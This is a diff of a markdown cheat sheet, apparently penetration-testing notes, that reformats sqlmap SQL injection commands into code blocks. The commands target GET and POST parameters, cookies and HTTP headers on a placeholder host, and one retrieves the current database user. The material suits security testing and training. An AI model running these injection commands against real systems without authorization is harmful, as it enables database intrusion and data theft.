@@ -65,17 +65,21 @@ Internal
 ```[sqlmap -r req.txt --current-user]```
 
 ## GET Request Injection
--   sqlmap -u "http://example.com/?id=1" -p id
--   sqlmap -u "http://example.com/?id=*" -p id
-
-## POST Request Injection
--   sqlmap -u "http://example.com" --data "username=*&password=*"
-
- 
+```powershell
+sqlmap -u "http://example.com/?id=1" -p id
+```
+```powershell
+sqlmap -u "http://example.com/?id=*" -p id
+```
+## POST Request Injection 
+```powershell
+sqlmap -u "http://example.com" --data "username=*&password=*"
+```
 ## Injections in Headers and other HTTP Methods
 # Inside cookie
--   sqlmap  -u "http://example.com" --cookie "mycookies=*"
-
+```powershell
+sqlmap  -u "http://example.com" --cookie "mycookies=*"
+```
 ## Inside some header
 -  sqlmap -u "http://example.com" --headers="x-forwarded-for:127.0.0.1*"
 -  sqlmap -u "http://example.com" --headers="referer:*"
